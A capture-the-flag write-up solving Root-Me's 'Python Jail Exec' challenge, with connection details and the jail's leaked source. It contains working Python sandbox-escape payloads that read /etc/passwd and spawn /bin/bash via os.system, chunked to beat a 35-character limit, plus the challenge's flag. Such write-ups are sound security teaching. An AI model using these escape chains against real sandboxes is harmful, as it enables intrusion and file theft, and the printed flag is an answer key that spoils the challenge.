# Python Jail Exec

URL: [https://www.root-me.org/en/Challenges/App-Script/Python-Jail-Exec](https://www.root-me.org/en/Challenges/App-Script/Python-Jail-Exec)

## Statement

Escape from python in order to gain a shell and find the file .passwd in a subdirectory
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                              |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                  |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                 |
| SSH access | [ssh -p 2222 app-script-ch10@challenge02.root-me.org](ssh://app-script-ch10:app-script-ch10@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_639&ssh=ssh://app-script-ch10:app-script-ch10@challenge02 "WebSSH") |
| Username   | app-script-ch10                                                                                                                                                                                                                                                                                                                      |
| Password   | app-script-ch10                                                                                                                                                                                                                                                                                                                      |
## Solution

If we crash the program with `Ctrl+C` we can leak some piece of code
```python
^CError in sys.excepthook:
Traceback (most recent call last):
  File "/usr/lib/python2.7/dist-packages/apport_python_hook.py", line 49, in apport_excepthook
    if exc_type in (KeyboardInterrupt, ):
NameError: global name 'KeyboardInterrupt' is not defined

Original exception was:
Traceback (most recent call last):
  File "/challenge/app-script/ch10/ch10.py", line 20, in <module>
    exec 'result = ' + saved_raw_input()[:35] in vars
KeyboardInterrupt
```

Our input is assigned to `result` via `exec` function and input is limited to 35 characters.
```python
> (1).__class__.__base__
Result: <type 'object'>
> result
Result: 0
> 'a' + 3
Error:  cannot concatenate 'str' and 'int' objects
```

::: info Note
`>` simply denotes my input
:::

Types get evaluated
```python
> [1,2,3]
Result: [1, 2, 3]
> [1,2,3][2]
Result: 3
```

No builtins
```python
__builtins__
Result: {}
```

[HackTricks > Bypass Python sandboxes > No Builtins > Python2](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins)

Since we are limited in length we can only use `__builtins__` as storage, as other variables declared are gone as soon as we get new prompt. We can copy **reference** to builtins dict to other variable and win some in length. Finally just keep chaining up string and then use exec to eval whole string.

Read the challenge file:
```python
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()

x=__builtins__;x[1]="'./ch10.py'"
x=__builtins__;x[0]="().__class__"
x=__builtins__;x[0]+=".__base__"
x=__builtins__;x[0]+=".__subcl"
x=__builtins__;x[0]+="asses__()"
x=__builtins__;x[0]+="[40]"
x=__builtins__;x[0]+="("+x[1]+")"
x=__builtins__;x[0]+=".read()"
x=__builtins__;exec "x[7]="+x[0]
1; print __builtins__[7][59]
```

```python
#!/usr/bin/env python2
# Arod 

from sys import modules
modules.clear()
del modules

saved_raw_input = raw_input
saved_exception = Exception

__builtins__.__dict__.clear()
__builtins__ = None

print 'Simple python calculator...'

while 1:
    try:
        vars = {'result':0}
        exec 'result = ' + saved_raw_input()[:35] in vars
        print 'Result:', vars['result']
    except saved_exception, e:
        print "Error: ", e
```

Now to get RCE, the first payload didn't work because of `warning` module not existing, but there are ways!
```bash
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['system']('ls')

x=__builtins__;x[1]="'func_glob"
x=__builtins__;x[1]+="als'"
x=__builtins__;x[2]="'linecache'"
x=__builtins__;x[3]="'os'"
x=__builtins__;x[4]="'system'"
x=__builtins__;x[5]="'/bin/bash'"
x=__builtins__;x[0]="().__class__"
x=__builtins__;x[0]+=".__base__"
x=__builtins__;x[0]+=".__subcl"
x=__builtins__;x[0]+="asses__()"
x=__builtins__;x[0]+="[59]"
x=__builtins__;x[0]+=".__init__"
x=__builtins__;x[0]+=".__getattrib"
x=__builtins__;x[0]+="ute__("+x[1]
x=__builtins__;x[0]+=")["+x[2]+"]"
x=__builtins__;x[0]+=".__dict__"
x=__builtins__;x[0]+="["+x[3]+"]"
x=__builtins__;x[0]+=".__dict__"
x=__builtins__;x[0]+="["+x[4]+"]"
x=__builtins__;x[0]+="("+x[5]+")"
x=__builtins__;exec "x[7]="+x[0]
1; print __builtins__[7][59]
```

```bash
app-script-ch10@challenge02:~$ cat ./GetTheFlagInThisDirectory/.passwd
PythonAlwaysHasAllYouNeed!
```

::: tip Flag
`PythonAlwaysHasAllYouNeed!`
:::

